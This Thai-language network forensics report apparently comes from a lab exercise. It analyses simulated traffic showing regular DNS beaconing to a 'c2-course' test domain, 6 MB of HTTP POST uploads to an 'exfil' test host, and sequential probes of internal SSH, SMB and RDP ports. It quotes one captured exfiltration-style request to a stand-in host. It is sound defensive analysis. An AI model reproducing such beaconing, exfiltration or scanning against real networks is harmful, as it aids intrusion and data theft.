**1. คู่ติดต่อ ผู้เริ่ม ports/protocol และการตอบกลับ**

พบคู่ติดต่อไม่ซ้ำ **27 IP** ได้แก่ DNS ภายใน 1 เครื่อง ฝั่ง WAN 1 เครื่อง และเครื่องภายในอีก 25 เครื่อง

| คู่ติดต่อ | การติดต่อจาก `10.70.0.66` | จำนวน | การตอบกลับที่พบ |
|---|---|---:|---|
| `10.70.0.53` | UDP `40000–40119 → 53` | 120 DNS transactions | ตอบ DNS ครบ 120 ครั้ง |
| `203.0.113.66` | TCP `40120–40239 → 443` | 120 connections | SYN-ACK, payload `OK` และการปิด TCP ทุก connection |
| `10.70.1.1–10.70.1.25` | TCP source ports `40240–40264` ไป ports ตามตารางด้านล่าง | 25 connections | SYN-ACK, payload `OK` และการปิด TCP ทุก connection |

DNS ทั้ง 120 ครั้งถาม A record ของ `c2-course.evidence.example.test` และได้รับ `NOERROR` พร้อมคำตอบ `203.0.113.66` ทุกครั้ง [F2 บรรทัด 1–120; F1 packets 1–240]

TCP ทั้ง 145 connections เริ่มจาก `10.70.0.66` พบ initial SYN 145, SYN-ACK 145 และไม่พบ initial SYN ที่คู่ติดต่อเริ่มเข้าหา IP นี้ ตัวอย่าง connection แรกคือ packets 241–247 [F1; F3 บรรทัด 121–265]

คำว่า **WAN** ในรายงานอิง `dstintf="wan"` ของ F6 สำหรับ `203.0.113.66` ไม่ได้ยืนยันว่าทราฟฟิกออกสู่อินเทอร์เน็ตจริง

**2. ลำดับเวลา จำนวน ช่วงห่าง และระยะเวลา**

| กิจกรรม | เวลาเริ่มครั้งแรก–ครั้งสุดท้าย | จำนวน/ช่วงห่างระหว่างเริ่ม | ระยะเวลาตั้งแต่เริ่มครั้งแรกถึงจบครั้งสุดท้าย |
|---|---|---|---|
| DNS | 00:00:00–01:59:00 | 120 ครั้ง; ทุก 60 วินาที | 7,140.001 วินาที |
| HTTP ไป `203.0.113.66:443` | 02:10:00–02:29:50 | 120 ครั้ง; ทุก 10 วินาที | 1,190.006 วินาที |
| ติดต่อเครื่องภายในเรียง IP | 02:40:00–02:44:00 | 25 ครั้ง; ทุก 10 วินาที | 240.006 วินาที |

ช่วงห่างของเวลาเริ่ม DNS ทั้ง 119 ช่วงเท่ากับ 60 วินาที และ HTTP ทั้ง 119 ช่วงเท่ากับ 10 วินาที ไม่มีความแปรปรวนใน timestamps ที่บันทึก การติดต่อภายในทั้ง 24 ช่วงห่างเท่ากับ 10 วินาทีเช่นกัน [F2 บรรทัด 1–120; F3 บรรทัด 121–265]

DNS แต่ละครั้งใช้ประมาณ **1 ms** ส่วน TCP แต่ละ connection ใช้ประมาณ **6 ms** จึงต้องแยก “ระยะเวลาครอบคลุมกิจกรรม” ในตารางออกจากเวลาที่แต่ละ connection เปิดอยู่ [F1 packets 1–1255; F3 `duration`]

ช่องว่างระหว่างกิจกรรม เมื่อวัดจาก packet สุดท้ายของช่วงก่อนถึง packet แรกของช่วงถัดไป:

- DNS → HTTP: **659.999 วินาที** [F1 #240 → #241]
- HTTP → ติดต่อภายใน: **609.994 วินาที** [F1 #1080 → #1081]

**3. ปริมาณส่งออก–รับกลับ และความหมายของ bytes**

สำหรับคู่ `10.70.0.66 ↔ 203.0.113.66`:

| สิ่งที่นับ | ส่งออก | รับกลับ |
|---|---:|---:|
| TCP payload | **6,010,330 bytes** | **240 bytes** |
| HTTP body ภายใน payload ขาส่ง | **6,000,000 bytes** | — |
| HTTP request line และ headers รวมตัวคั่น | **10,330 bytes** | — |
| IP bytes รวม IP/TCP headers | **6,029,530 bytes** | **14,640 bytes** |
| Packets | **480** | **360** |

ยอด TCP payload จาก F1 ตรงกับผลรวม `orig_bytes/resp_bytes` ของ F3 และ `sentbyte/rcvdbyte` ของ F6 ส่วน `bytes` ใน F4 ชุดนี้ตรงกับ **payload ขาส่ง** จำนวน 6,010,330 bytes ไม่ใช่ IP bytes และไม่มีตัวเลขขารับให้ใช้แทน F1/F3 [F1 #241–1080; F3/F4/F6 บรรทัด 121–240]

IP bytes รวม headers ของ TCP packets ทุก packet รวมถึง handshake และการปิด connection แต่ไม่รวม Ethernet headers ส่วนตัวเลขจากหลายไฟล์เป็นมุมมองของการติดต่อชุดเดียวกัน **ห้ามบวกข้ามไฟล์เป็นปริมาณใหม่**

ตัวอย่าง payload ที่อ่านได้จาก F1 #244:

```http
POST /upload/0 HTTP/1.0
Host: exfil.evidence.example.test
Content-Length: 50000

AAAA...
```

พบ `/upload/0` ถึง `/upload/119` ทั้งหมด 120 requests แต่ละ body มี 50,000 bytes นอกจากอ่านส่วนต้นแล้ว ยังตรวจรูปแบบกับ payload เต็ม พบว่าทั้ง 120 bodies เป็นตัวอักษรหนึ่งตัวในช่วง `A–T` ซ้ำ 50,000 ตัว [F1 packets `244 + 7k`, เมื่อ `k=0…119`]

ปลายทางตอบ `OK` ซึ่งมี hex `4f4b` ครั้งละ 2 bytes รวม 240 bytes [F1 packets `245 + 7k`]

สิ่งนี้ยืนยัน **การส่ง HTTP plaintext และการได้รับข้อความตอบกลับ** แต่:

- `OK` ไม่ใช่ HTTP status `200 OK` และไม่พิสูจน์ว่าปลายทางจัดเก็บข้อมูลสำเร็จ
- ไม่พบ TLS บนคู่ TCP/443 นี้ แม้ F6 ระบุ `app="HTTPS"`
- body ตัวอักษรซ้ำและชื่อ `exfil` ยังไม่ใช่หลักฐานว่ามีข้อมูลลับถูกขโมย
- DNS ที่เห็นถามชื่อ `c2-course…` ส่วน HTTP Host เป็น `exfil…`; ไม่พบ DNS lookup ของชื่อหลังใน F2

**4. เครื่องภายใน รูปแบบ และระดับผลสำเร็จ**

นอกจาก DNS server `10.70.0.53` แล้ว พบเครื่องภายในดังนี้:

| TCP port ปลายทาง | IP ที่ติดต่อ | จำนวน |
|---|---|---:|
| 22 | `10.70.1.1`, `10.70.1.4`, `10.70.1.7`, `10.70.1.10`, `10.70.1.13`, `10.70.1.16`, `10.70.1.19`, `10.70.1.22`, `10.70.1.25` | 9 |
| 445 | `10.70.1.2`, `10.70.1.5`, `10.70.1.8`, `10.70.1.11`, `10.70.1.14`, `10.70.1.17`, `10.70.1.20`, `10.70.1.23` | 8 |
| 3389 | `10.70.1.3`, `10.70.1.6`, `10.70.1.9`, `10.70.1.12`, `10.70.1.15`, `10.70.1.18`, `10.70.1.21`, `10.70.1.24` | 8 |

ติดต่อเรียงจาก `.1` ถึง `.25` เครื่องละหนึ่งครั้ง สลับ ports **22 → 445 → 3389** แล้ววนซ้ำ ทุก 10 วินาที หากพิจารณาเฉพาะ port เดียวจะห่างกัน 30 วินาที [F3/F4/F6 บรรทัด 241–265; F1 #1081–1255]

ทุกเครื่องได้รับ payload เดียวกัน 35 bytes:

```text
LAB13 coherent remote service probe
```

และตอบ `OK` 2 bytes รวมขาส่ง **875 bytes** ขารับ **50 bytes** ตัวอย่าง:

- `.1:22`: F1 #1084 ส่ง probe; #1085 ตอบ `OK`
- `.2:445`: F1 #1091 ส่ง probe; #1092 ตอบ `OK`
- `.3:3389`: F1 #1098 ส่ง probe; #1099 ตอบ `OK`
- `.25:22`: F1 #1252 ส่ง probe; #1253 ตอบ `OK`

หลักฐานรองรับถึงระดับ **TCP เชื่อมต่อได้ มี payload ไป–กลับ และปิด connection** โดย F3 แสดง `SF`, `history="ShADdFf"` ทุก connection แต่ payload นี้ไม่พิสูจน์ SSH authentication, SMB session/file access, RDP login หรือการรันคำสั่งสำเร็จ

สำหรับตรวจย้อนกลับเครื่อง `10.70.1.n` เมื่อ `n=1…25`: record อยู่ที่บรรทัด `240+n` ของ F3/F4/F6 และ packets อยู่ระหว่าง `1081+7(n−1)` ถึง `1087+7(n−1)` ของ F1

**5. ข้อที่ยืนยันได้ สมมติฐาน และข้อที่ยังสรุปไม่ได้**

| ระดับ | ข้อสรุป | หลักฐาน/ข้อจำกัด |
|---|---|---|
| ยืนยันได้ | DNS มีจังหวะสม่ำเสมอและตอบ IP เดียวกัน 120 ครั้ง | F2 บรรทัด 1–120; F1 #1–240 |
| ยืนยันได้ | ส่ง HTTP plaintext 120 requests พร้อม body รวม 6 MB และได้รับ `OK` ทุกครั้ง | F1 #241–1080; F3 บรรทัด 121–240 |
| ยืนยันได้ | ติดต่อภายในเรียง 25 IP พร้อม probe และการตอบกลับ | F1 #1081–1255; F3 บรรทัด 241–265 |
| สมมติฐาน | DNS อาจเป็น beaconing/C2 | จังหวะสม่ำเสมอสนับสนุนการทำงานอัตโนมัติ แต่ไม่ระบุโปรเซสหรือคำสั่งควบคุม |
| สมมติฐาน | การส่ง HTTP อาจจำลอง exfiltration | มี upload และข้อมูลไหลออกมาก แต่ body เป็นตัวอักษรซ้ำ |
| สมมติฐาน | การติดต่อภายในอาจเป็นการสำรวจบริการ/เตรียม lateral movement | รูปแบบไล่ IP และ ports สนับสนุนการ probe แต่ยังไม่พิสูจน์การเข้าถึงบริการจริง |
| ยังสรุปไม่ได้ | เครื่องติดมัลแวร์ ขโมยข้อมูลจริง ยึดเครื่องอื่น หรือ login สำเร็จ | ไม่มีหลักฐานดังกล่าวใน records/payload ที่ตรวจ |

F5 มี **340 alerts ไม่ใช่ 340 connections**: DNS 120, outbound transfer 120 และภายใน 100 alerts ซึ่งมาจาก 25 connections × 4 packets ตัวอย่าง F5 บรรทัด 241–244 อ้าง F1 #1081, #1083, #1084, #1086 ของ connection เดียวกัน

F6 records ที่เกี่ยวข้องทั้ง 265 รายการระบุ `simulation="true"` และ `evidence_origin="pcap-derived"` จึงไม่ควรถือเป็นคำยืนยันอิสระจากไฟร์วอลล์จริง หรือใช้ชื่อ policy/alert เป็นคำตัดสินการโจมตี

ตรวจความสัมพันธ์แล้วตรงกันครบ: F2→F3 ด้วย UID 120 รายการ, F3→F6 ด้วย parentuid 265 รายการ, F3→F4 ด้วย tuple/bytes/packets/เวลาจบ 265 รายการ และ F5→F1 ด้วยหมายเลข packet/tuple/timestamp 340 รายการ (ไฟล์ผลตรวจเทียบและ manifest ของรอบนี้ถูกนำออกจาก repo แล้ว)
